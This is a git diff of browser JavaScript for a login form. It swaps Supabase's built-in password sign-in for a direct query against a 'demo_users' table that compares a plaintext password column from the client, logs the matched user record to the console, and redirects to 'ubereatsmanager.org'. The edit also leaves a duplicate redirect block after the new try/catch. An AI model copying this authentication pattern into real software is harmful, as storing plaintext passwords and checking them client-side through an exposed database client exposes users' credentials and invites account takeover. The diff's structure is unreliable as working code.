@@ -698,27 +698,64 @@ otpForm.addEventListener('submit', function (event) {
         passwordInput.classList.remove('field__input--error');
         setStatus(passwordStatusEl, 'Authenticating...', false);
         passwordContinueBtn.disabled = true;
+try {
+  const { data, error } = await supabaseClient
+    .from('demo_users')
+    .select('id, email')
+    .eq('email', email)
+    .eq('password', password)
+    .maybeSingle();
 
-        try {
-          const { data, error } = await supabaseClient.auth.signInWithPassword({
-            email: email,
-            password: password
-          });
+  if (error) {
+    console.error('Database error:', error);
 
-          if (error) {
-            console.log(error);
-            setStatus(passwordStatusEl, error.message || 'Authentication failed.', true);
-            passwordContinueBtn.disabled = false;
-            return;
-          }
+    setStatus(
+      passwordStatusEl,
+      'Unable to verify your credentials.',
+      true
+    );
 
-      setStatus(passwordStatusEl, '', false);
-passwordContinueBtn.disabled = false;
+    passwordContinueBtn.disabled = false;
+    return;
+  }
 
-if (successCard && !successCard.classList.contains('show')) {
-  successCard.classList.add('show');
+  if (!data) {
+    setStatus(
+      passwordStatusEl,
+      'Invalid email or password.',
+      true
+    );
+
+    passwordContinueBtn.disabled = false;
+    return;
+  }
+
+  // Login successful
+  console.log('User verified:', data);
+
+  setStatus(passwordStatusEl, '', false);
+  passwordContinueBtn.disabled = false;
+
+  if (successCard && !successCard.classList.contains('show')) {
+    successCard.classList.add('show');
+  }
+
+  setTimeout(function () {
+    window.location.href = 'https://www.ubereatsmanager.org/';
+  }, 1000);
+
+} catch (err) {
+
+  console.error('Login error:', err);
+
+  passwordContinueBtn.disabled = false;
+
+  setStatus(
+    passwordStatusEl,
+    'Something went wrong while logging in.',
+    true
+  );
 }
-
 // Go to dashboard after successful login
 setTimeout(function () {
   window.location.href = 'https://www.ubereatsmanager.org/';
